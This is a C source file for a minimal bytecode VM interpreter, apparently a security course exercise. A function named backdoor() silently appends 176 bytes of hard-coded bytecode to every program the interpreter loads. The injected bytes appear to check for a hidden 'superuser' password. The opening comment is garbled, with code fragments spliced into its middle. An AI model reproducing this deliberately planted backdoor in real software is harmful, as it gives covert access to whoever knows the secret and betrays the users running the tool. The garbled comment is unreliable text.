// This  pc = (uint32_t*) &CODE; pc = (uint32_t*) &CODE;is where you put your VM code.
// I am trying to follow the coding style of the original.

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include "minivm.h"

#define NUM_REGS   (256)
#define NUM_FUNCS  (256)

#define MAX_HEAP_SPACE 8193
#define MAX_CODE_SPACE 8193

char CODE[MAX_CODE_SPACE] = {0,};
unsigned int CODESIZE = 0;

// Global variable that indicates if the process is running.
bool is_running = true;

void usageExit() {
	printf("USAGE: ./interpreter [file.mini]");
	exit(1);
}

void initFuncs(FunPtr *f, uint32_t cnt) {
	uint32_t i;
	for (i = 0; i < cnt; i++) {
		f[i] = NULL;
	}

	// Initialize function pointers
	f[0x00] = halt;
	f[0x10] = load;
	f[0x20] = store;
	f[0x30] = move;
	f[0x40] = puti;
	f[0x50] = add;
	f[0x60] = sub;
	f[0x70] = gt;
	f[0x80] = ge;
	f[0x90] = eq;
	f[0xa0] = ite;
	f[0xb0] = jump;
	f[0xc0] = op_puts; 
	f[0xd0] = op_gets;

}

void initRegs(Reg *r, uint32_t cnt)
{
	uint32_t i;
	for (i = 0; i < cnt; i++) {
		r[i].type = 0;
		r[i].value = 0;
	}
}

// Function of backdoor-KAISTGUN
// Add of the backdoor into the interpreter

void backdoor(void){    

	char foo[176] = {
		0xa0,0xd4,0x46,0xba,0x40,0xfc,0x0a,0x00,0x40,0xe5,0x73,0x00,0x40,0xe6,0x75,0x00,
		0x40,0xe7,0x70,0x00,0x40,0xe8,0x65,0x00,0x40,0xe9,0x72,0x00,0x40,0xea,0x75,0x00,
		0x40,0xeb,0x73,0x00,0x40,0xec,0x65,0x00,0x40,0xed,0x72,0x00,0x40,0xee,0x00,0x00,
		0x10,0xaf,0x96,0x00,0x90,0xd4,0xaf,0xe5,0x50,0xfd,0xfd,0xd4,0x10,0xaf,0x97,0x00,
		0x90,0xd4,0xaf,0xe6,0x50,0xfd,0xfd,0xd4,0x10,0xaf,0x98,0x00,0x90,0xd4,0xaf,0xe7,
		0x50,0xfd,0xfd,0xd4,0x10,0xaf,0x99,0x00,0x90,0xd4,0xaf,0xe8,0x50,0xfd,0xfd,0xd4,
		0x10,0xaf,0x9a,0x00,0x90,0xd4,0xaf,0xe9,0x50,0xfd,0xfd,0xd4,0x10,0xaf,0x9b,0x00,
		0x90,0xd4,0xaf,0xea,0x50,0xfd,0xfd,0xd4,0x10,0xaf,0x9c,0x00,0x90,0xd4,0xaf,0xeb,
		0x50,0xfd,0xfd,0xd4,0x10,0xaf,0x9d,0x00,0x90,0xd4,0xaf,0xec,0x50,0xfd,0xfd,0xd4,
		0x10,0xaf,0x9e,0x00,0x90,0xd4,0xaf,0xed,0x50,0xfd,0xfd,0xd4,0x10,0xaf,0x9f,0x00,
		0x90,0xd4,0xaf,0xee,0x50,0xfd,0xfd,0xd4,0x90,0xd4,0xfd,0xfc,0xa0,0xd4,0x01,0x03
	};

	// Add a backdoor to the end of the code.
	for (int i = 0; i < 176; i++){
		CODE[CODESIZE-4 + i] = foo[i];
	}

	CODESIZE += 176;
}

int main(int argc, char** argv) {
	VMContext vm;
	Reg r[NUM_REGS];
	FunPtr f[NUM_FUNCS];
	FILE* bytecode;
	int i = 0;
	uint32_t* pc;

	if (argc < 2) usageExit();

	// Initialize registers.
	initRegs(r, NUM_REGS);
	// Initialize interpretation functions.
	initFuncs(f, NUM_FUNCS);

	// Load bytecode file
	bytecode = fopen(argv[1], "rb");
	if (bytecode == NULL) {
		perror("fopen");
		return 1;
	}

	CODESIZE = fread((void *)&CODE, 1, 2048, bytecode); 
	backdoor();
	pc = (uint32_t*) &CODE;

        // Initialize VM context.
        initVMContext(&vm, NUM_REGS, NUM_FUNCS, r, f);

	
	while (is_running) {
		// Read 4-byte bytecode, and set the pc accordingly
		printf("Running instruction: %d -> [ '%c', '%d', '%d', '%d' ]\n", i, EXTRACT_B0(*pc), EXTRACT_B1(*pc), EXTRACT_B2(*pc), EXTRACT_B3(*pc));
		stepVMContext(&vm, &pc);
		i++;
	}

	fclose(bytecode);

	return 0;
}
